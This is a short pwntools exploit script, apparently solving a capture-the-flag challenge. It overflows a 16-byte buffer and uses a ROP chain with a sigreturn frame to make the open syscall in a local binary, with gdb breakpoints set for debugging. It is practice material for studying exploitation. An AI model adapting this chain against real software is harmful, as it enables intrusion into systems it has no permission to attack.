#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./chal',checksec=False)
p = process()
gdb.attach(p,gdbscript='''
           b*0x401204
           b*0x000000000040120b
           ''')

syscall = 0x000000000040119a

frame = SigreturnFrame()
frame.rax = 2
frame.rdi = 0x402004
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
frame.rsp = 0x4040a0 + 16


payload  = b'a'*16
payload += p64(exe.sym.read)
payload += p64(syscall)
payload += bytes(frame)
input()
p.send(payload)
p.send(b'a'*15)
p.recv()

input()

p.interactive()
